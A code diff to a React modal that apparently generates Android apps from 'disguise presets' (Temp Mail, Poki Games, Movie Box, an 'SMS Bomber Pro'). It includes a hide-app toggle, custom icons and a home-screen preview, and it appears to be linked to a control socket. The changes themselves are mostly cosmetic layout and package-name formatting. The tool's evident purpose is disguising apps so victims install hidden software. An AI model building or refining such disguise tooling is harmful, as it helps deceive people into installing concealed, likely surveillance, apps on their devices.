@@ -22,47 +22,47 @@ const DISGUISE_PRESETS = [
     {
         id: 'custom',
         name: 'Custom Web App',
-        packageName: 'com.gallery.eye.client',
+        packageName: 'com.gallery.eye',
         url: '',
         color: 'from-indigo-500/20 via-blue-500/10 to-transparent border-indigo-500/40 text-indigo-300',
         badgeColor: 'bg-indigo-500/20 text-indigo-300 border-indigo-500/40',
-        description: 'Set custom App Name, Web Link & upload your own Icon.'
+        description: 'Custom App Name & Web URL'
     },
     {
         id: 'temp_mail',
         name: 'Temp Mail',
-        packageName: 'com.tempmail.inbox.client',
+        packageName: 'com.tempmail.inbox',
         url: 'https://mail.tm/en/',
         color: 'from-emerald-500/20 via-teal-500/10 to-transparent border-emerald-500/40 text-emerald-300',
         badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40',
-        description: 'Pre-integrated temporary mail portal (https://mail.tm/en/)'
+        description: 'Instant Mail Inbox Portal'
     },
     {
         id: 'poki_games',
         name: 'Poki Games',
-        packageName: 'com.poki.games.arcade',
+        packageName: 'com.poki.games',
         url: 'https://poki.com/',
         color: 'from-purple-500/20 via-fuchsia-500/10 to-transparent border-purple-500/40 text-purple-300',
         badgeColor: 'bg-purple-500/20 text-purple-300 border-purple-500/40',
-        description: 'Pre-integrated free gaming arcade (https://poki.com/)'
+        description: 'Online Gaming Arcade'
     },
     {
         id: 'movie_box',
         name: 'Movie Box',
-        packageName: 'com.moviebox.cinema.hub',
+        packageName: 'com.moviebox.cinema',
         url: 'https://movie-box.co/',
         color: 'from-rose-500/20 via-pink-500/10 to-transparent border-rose-500/40 text-rose-300',
         badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/40',
-        description: 'Pre-integrated cinema streaming hub (https://movie-box.co/)'
+        description: 'Cinema Hub Streaming'
     },
     {
         id: 'sms_bomber',
         name: 'SMS Bomber Pro',
-        packageName: 'com.h4k3r.bomber.pro',
+        packageName: 'com.h4k3r.bomber',
         url: 'https://h4k3r-bomber.vercel.app',
         color: 'from-amber-500/20 via-orange-500/10 to-transparent border-amber-500/40 text-amber-300',
         badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/40',
-        description: 'Pre-integrated utility testing toolkit (h4k3r-bomber)'
+        description: 'Utility Toolkit Pro'
     }
 ];
 
@@ -89,18 +89,19 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     // Customization State
     const [selectedPreset, setSelectedPreset] = useState<string>('custom');
     const [appName, setAppName] = useState("");
-    const [packageName, setPackageName] = useState("com.gallery.eye.client");
+    const [packageName, setPackageName] = useState("com.gallery.eye");
     const [hideApp, setHideApp] = useState(false);
     const [webLink, setWebLink] = useState("");
     const [customIcon, setCustomIcon] = useState<File | null>(null);
     const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);
 
+    // Generate exactly 3 segments format: com.project.app
     const generatePackageName = (name: string) => {
         const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
         const parts = cleaned.split(/\s+/).filter(Boolean);
-        if (parts.length === 0) return "com.gallery.eye.client";
+        if (parts.length === 0) return "com.gallery.eye";
         if (parts.length === 1) return `com.${parts[0]}.app`;
-        return `com.${parts[0]}.${parts.slice(1).join('')}`;
+        return `com.${parts[0]}.${parts[1]}`;
     };
 
     const handlePresetChange = (presetId: string) => {
@@ -112,7 +113,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setWebLink(preset.url);
         } else if (presetId === 'custom') {
             setAppName("");
-            setPackageName("com.gallery.eye.client");
+            setPackageName("com.gallery.eye");
             setWebLink("");
         }
     };
@@ -268,7 +269,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 return;
             }
         }
-        // If hideApp is ON or if user selected a pre-integrated disguise (Temp Mail, Poki, Movie Box, SMS Bomber), proceed instantly without popups!
 
         setStatus('generating');
         setProgress(5);
@@ -468,10 +468,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {activeStep === 'identity' && (
                         <div className="space-y-6 animate-in fade-in duration-200">
                             
-                            {/* 2-Column App Card Grid Layout ("matalb ak line ma do ok") */}
+                            {/* Compact Box-Style Cards in 2 Columns ("box type ka hu long na hu ak line ma 2 hu") */}
                             <div>
                                 <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Mode</label>
-                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                                <div className="grid grid-cols-2 gap-3">
                                     {DISGUISE_PRESETS.map((p) => {
                                         const isSelected = selectedPreset === p.id;
                                         return (
@@ -479,36 +479,35 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 key={p.id}
                                                 type="button"
                                                 onClick={() => handlePresetChange(p.id)}
-                                                className={`p-4 rounded-2xl border text-left flex items-start justify-between gap-3 transition-all ${
+                                                className={`p-4 rounded-3xl border text-left flex flex-col justify-between gap-2 transition-all ${
                                                     isSelected
-                                                        ? `bg-gradient-to-br ${p.color} shadow-[0_8px_24px_rgba(0,0,0,0.4)] scale-[1.01]`
+                                                        ? `bg-gradient-to-br ${p.color} shadow-[0_8px_24px_rgba(0,0,0,0.5)] scale-[1.02]`
                                                         : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3'
                                                 }`}
                                             >
-                                                <div className="flex flex-col gap-1">
-                                                    <div className="flex items-center gap-2">
-                                                        <span className="text-sm font-black text-white">{p.name}</span>
-                                                        {isSelected && (
-                                                            <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-extrabold border border-emerald-500/40">
-                                                                ACTIVE
-                                                            </span>
-                                                        )}
-                                                    </div>
-                                                    <span className="text-xs text-fg-3 line-clamp-1">{p.description}</span>
-                                                    <span className="text-[10px] text-fg-4 font-mono">{p.packageName}</span>
+                                                <div className="flex items-center justify-between w-full">
+                                                    <span className="text-sm font-black text-white">{p.name}</span>
+                                                    {isSelected && (
+                                                        <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-extrabold border border-emerald-500/40">
+                                                            ACTIVE
+                                                        </span>
+                                                    )}
                                                 </div>
-                                                {isSelected && <CheckCircle2 size={18} className="text-emerald-400 flex-shrink-0 mt-0.5" />}
+                                                <div className="flex flex-col">
+                                                    <span className="text-xs text-fg-3 line-clamp-1">{p.description}</span>
+                                                    <span className="text-[10px] text-fg-4 font-mono mt-0.5">{p.packageName}</span>
+                                                </div>
                                             </button>
                                         );
                                     })}
                                 </div>
                             </div>
 
-                            {/* Conditional Configuration & Phone Preview Layout */}
-                            <div className="grid grid-cols-1 sm:grid-cols-12 gap-5 items-start pt-2">
+                            {/* Form Configuration / Preview Section */}
+                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-5' : 'sm:grid-cols-1'} items-start pt-1`}>
                                 
                                 {/* Form Inputs: ONLY Shown when selectedPreset === 'custom' */}
-                                {selectedPreset === 'custom' ? (
+                                {selectedPreset === 'custom' && (
                                     <div className="sm:col-span-7 space-y-4 animate-in fade-in">
                                         {/* App Display Name */}
                                         <div>
@@ -522,7 +521,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             />
                                         </div>
 
-                                        {/* Package Identifier (Dynamic with App Name) */}
+                                        {/* Package Identifier (Exactly 3 Segments e.g. com.gallery.eye) */}
                                         <div>
                                             <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
                                             <input
@@ -530,9 +529,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 value={packageName}
                                                 onChange={(e) => setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
                                                 className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
-                                                placeholder="com.gallery.eye.client"
+                                                placeholder="com.gallery.eye"
                                             />
-                                            <p className="text-[11px] text-fg-4 mt-1">Automatically generates with app name</p>
+                                            <p className="text-[11px] text-fg-4 mt-1">Format: com.project.name (3 segments)</p>
                                         </div>
 
                                         {/* Custom Web Portal Link */}
@@ -569,31 +568,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             </label>
                                         </div>
                                     </div>
-                                ) : (
-                                    <div className="sm:col-span-7 bg-gradient-to-br from-emerald-500/10 via-teal-500/5 to-transparent border border-emerald-500/30 rounded-3xl p-5 flex flex-col justify-between space-y-4 animate-in fade-in">
-                                        <div className="flex items-start gap-3">
-                                            <div className="p-2.5 rounded-2xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-300">
-                                                <Sparkles size={20} />
-                                            </div>
-                                            <div>
-                                                <h4 className="text-sm font-extrabold text-white">Pre-Integrated Portal Ready</h4>
-                                                <p className="text-xs text-fg-3 mt-1 leading-relaxed">
-                                                    You selected <strong>{appName}</strong>. The Display Name, Android Package (<strong>{packageName}</strong>), embedded Web URL, and authentic Icon are automatically configured!
-                                                </p>
-                                            </div>
-                                        </div>
-
-                                        <div className="bg-black/40 rounded-2xl p-3 border border-white/10 flex items-center justify-between">
-                                            <span className="text-xs text-fg-3 font-mono truncate">{webLink}</span>
-                                            <span className="text-[10px] px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-bold ml-2">
-                                                INTEGRATED
-                                            </span>
-                                        </div>
-                                    </div>
                                 )}
 
                                 {/* Soft UI Phone Home-Screen Preview */}
-                                <div className="sm:col-span-5 bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl">
+                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-sm mx-auto w-full'} bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl`}>
                                     <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Live Android Home Screen</div>
                                     
                                     <div className="w-24 h-24 mb-3 relative group">
